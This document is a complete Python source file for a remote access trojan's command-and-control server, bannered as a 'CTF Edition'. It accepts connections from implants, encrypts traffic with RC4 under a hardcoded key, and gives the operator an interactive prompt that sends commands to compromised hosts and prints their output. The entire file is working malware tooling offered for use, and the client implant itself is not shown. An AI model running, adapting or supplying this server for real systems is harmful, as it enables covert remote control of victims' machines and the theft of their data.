#!/usr/bin/env python3
"""
Hardened RAT C2 Server
Encrypted communication with RC4
"""

import socket
import struct
import threading
import sys
from datetime import datetime

# RC4 Implementation
class RC4:
    def __init__(self, key):
        self.key = key
        self.S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
    
    def crypt(self, data):
        S = self.S.copy()
        i = j = 0
        result = bytearray()
        
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)
        
        return bytes(result)

class C2Server:
    def __init__(self, host='0.0.0.0', port=50005):
        self.host = host
        self.port = port
        self.key = b"MySecretKey2024!"
        self.clients = []
        self.running = True
        
    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {message}")
    
    def send_encrypted(self, sock, data):
        try:
            # Encrypt data
            rc4 = RC4(self.key)
            encrypted = rc4.crypt(data.encode() if isinstance(data, str) else data)
            
            # Send length first
            length = struct.pack('!I', len(encrypted))
            sock.sendall(length)
            
            # Send encrypted data
            sock.sendall(encrypted)
            return True
        except Exception as e:
            self.log(f"Send error: {e}")
            return False
    
    def recv_encrypted(self, sock):
        try:
            # Receive length
            length_data = self.recv_all(sock, 4)
            if not length_data:
                return None
            
            length = struct.unpack('!I', length_data)[0]
            
            if length > 1024 * 1024:  # 1MB limit
                self.log("Received data too large, rejecting")
                return None
            
            # Receive encrypted data
            encrypted = self.recv_all(sock, length)
            if not encrypted:
                return None
            
            # Decrypt
            rc4 = RC4(self.key)
            decrypted = rc4.crypt(encrypted)
            
            return decrypted.decode('utf-8', errors='replace')
        except Exception as e:
            self.log(f"Recv error: {e}")
            return None
    
    def recv_all(self, sock, length):
        data = b''
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        return data
    
    def handle_client(self, client_sock, client_addr):
        self.log(f"New connection from {client_addr[0]}:{client_addr[1]}")
        self.clients.append(client_sock)
        
        try:
            # Receive banner
            banner = self.recv_encrypted(client_sock)
            if banner:
                print(banner, end='')
            
            # Interactive shell
            while self.running:
                try:
                    # Get command from user
                    command = input(f"\n{client_addr[0]}> ").strip()
                    
                    if not command:
                        continue
                    
                    # Send command
                    if not self.send_encrypted(client_sock, command):
                        break
                    
                    if command in ['exit', 'q']:
                        self.log("Client disconnecting...")
                        break
                    
                    # Receive response
                    response = self.recv_encrypted(client_sock)
                    if response:
                        print(response, end='')
                    else:
                        self.log("No response from client")
                        break
                        
                except KeyboardInterrupt:
                    self.log("\nInterrupted by user")
                    break
                except Exception as e:
                    self.log(f"Error in command loop: {e}")
                    break
        
        except Exception as e:
            self.log(f"Client handler error: {e}")
        finally:
            self.log(f"Connection closed: {client_addr[0]}:{client_addr[1]}")
            if client_sock in self.clients:
                self.clients.remove(client_sock)
            try:
                client_sock.close()
            except:
                pass
    
    def start(self):
        try:
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_sock.bind((self.host, self.port))
            server_sock.listen(5)
            
            self.log(f"C2 Server listening on {self.host}:{self.port}")
            self.log("Waiting for connections...")
            
            while self.running:
                try:
                    server_sock.settimeout(1.0)
                    try:
                        client_sock, client_addr = server_sock.accept()
                    except socket.timeout:
                        continue
                    
                    # Handle client in new thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_sock, client_addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except KeyboardInterrupt:
                    self.log("\nShutting down server...")
                    self.running = False
                    break
                except Exception as e:
                    self.log(f"Accept error: {e}")
        
        except Exception as e:
            self.log(f"Server error: {e}")
        finally:
            # Cleanup
            for client in self.clients:
                try:
                    client.close()
                except:
                    pass
            try:
                server_sock.close()
            except:
                pass
            self.log("Server stopped")

if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════════════════════════╗
║          Hardened RAT C2 Server - CTF Edition            ║
║              Encrypted RC4 Communications                 ║
╚═══════════════════════════════════════════════════════════╝
""")
    
    # Parse arguments
    host = '0.0.0.0'
    port = 50005
    
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    if len(sys.argv) > 2:
        host = sys.argv[2]
    
    # Start server
    server = C2Server(host=host, port=port)
    server.start()
